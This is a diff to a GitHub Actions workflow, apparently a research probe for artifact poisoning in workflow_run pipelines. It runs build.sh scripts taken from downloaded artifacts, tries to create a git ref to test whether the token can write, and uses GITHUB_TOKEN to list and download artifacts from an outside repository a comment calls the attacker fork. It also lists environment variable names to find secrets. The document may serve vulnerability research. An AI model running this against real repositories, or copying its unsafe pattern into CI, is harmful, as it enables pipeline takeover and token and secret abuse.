@@ -3,52 +3,62 @@ on:
   workflow_run:
     workflows: ["CI"]
     type: completed
-    branches: [main]
 jobs:
   consume:
     runs-on: ubuntu-latest
     env:
       RUNID: ${{ github.event.workflow_run.id }}
-      WF: ${{ github.event.workflow_run.workflow }}
       ACTOR: ${{ github.event.workflow_run.actor.login }}
       HEADMSG: ${{ github.event.workflow_run.head_commit.message }}
+      RUNREF: ${{ github.event.workflow_run.head_branch }}
     steps:
-      - name: download pinned to the triggering run
+      - name: pinned download (workflow + run-id)
+        continue-on-error: true
         uses: actions/download-artifact@v4
         with:
           name: build
+          workflow: CI
           run-id: ${{ env.RUNID }}
           path: pinned
-      - run: cat pinned/build.txt
-      - name: download by workflow name only (latest run wins)
+      - name: what did the pinned download give us
+        run: |
+          echo "--- pinned (run ${RUNID}, actor ${ACTOR}, ref ${RUNREF}) ---"
+          cat pinned/marker.txt 2>/dev/null || echo "pinned: MISSING"
+          bash pinned/build.sh 2>/dev/null || echo "pinned script: MISSING"
+      - name: unpinned download (workflow name only, latest run wins)
+        continue-on-error: true
         uses: actions/download-artifact@v4
         with:
           name: build
           workflow: CI
           path: latest
-      - run: cat latest/build.txt
-      - name: inventory + privilege probes
+      - name: what did the by-name download give us
         run: |
-          echo "triggering run=${RUNID} wf=${WF} actor=${ACTOR}"
-          echo "head commit message (attacker controlled): ${HEADMSG}"
-          echo "--- artifacts visible in this repo ---"
+          echo "--- by-name latest ---"
+          cat latest/marker.txt 2>/dev/null || echo "latest: MISSING"
+          bash latest/build.sh 2>/dev/null || echo "latest script: MISSING"
+      - name: inventory and privilege probes
+        run: |
+          echo "triggering run=${RUNID} actor=${ACTOR}"
+          echo "--- artifacts visible in this repo (all workflows, all runs) ---"
           gh api "/repos/${GITHUB_REPOSITORY}/actions/artifacts?per_page=100" \
-            --jq '.artifacts[] | "\(.id) run=\(.workflow_run.id) name=\(.name) created=\(.created_at)"' || true
-          echo "--- can this token write? ---"
+            --jq '.artifacts[] | "\(.id) run=\(.workflow_run.id) name=\(.name)"' 2>&1 | head -20 || true
+          echo "--- token write probe (create a scratch ref) ---"
           if gh api -X POST "/repos/${GITHUB_REPOSITORY}/refs" -f ref=scratch/probe -f sha="${GITHUB_SHA}" >/dev/null 2>&1; then
             echo "TOKEN_WRITE=yes"
           else
             echo "TOKEN_WRITE=no"
           fi
-          echo "--- cross-repo artifact read (attacker fork) ---"
+          echo "--- cross-repo artifact LIST with this token ---"
           gh api "/repos/its-not-elliot/vercel-lab/actions/artifacts?per_page=5" \
-            --jq '.total_count' 2>&1 | head -3
-          echo "--- cross-repo artifact DOWNLOAD with our token ---"
+            --jq '"total=" + (.total_count|tostring)' 2>&1 | head -3 || true
+          echo "--- cross-repo artifact DOWNLOAD with this token ---"
           AID=$(gh api "/repos/its-not-elliot/vercel-lab/actions/artifacts?per_page=1" --jq '.artifacts[0].id' 2>/dev/null)
-          if [ -n "$AID" ]; then
-            curl -sL -H "Authorization: Bearer $GITHUB_TOKEN" -o /tmp/x.bin \
-              "https://api.github.com/repos/its-not-elliot/vercel-lab/actions/artifacts/${AID}/zip" -w "http=%{http_code}\n"
-            ls -l /tmp/x.bin
-          else
-            echo "no artifacts in fork yet"
+          echo "fork artifact id=${AID}"
+          if [ -n "${AID}" ] && [ "${AID}" != "null" ]; then
+            curl -sL -H "Authorization: Bearer ${GITHUB_TOKEN}" -o /tmp/x.bin -w "http=%{http_code}\n" \
+              "https://api.github.com/repos/its-not-elliot/vercel-lab/actions/artifacts/${AID}/zip"
+            ls -l /tmp/x.bin 2>/dev/null || true
           fi
+          echo "--- secrets present? (names only) ---"
+          env | grep -oE '^[A-Z_]+=' | sort | head -40
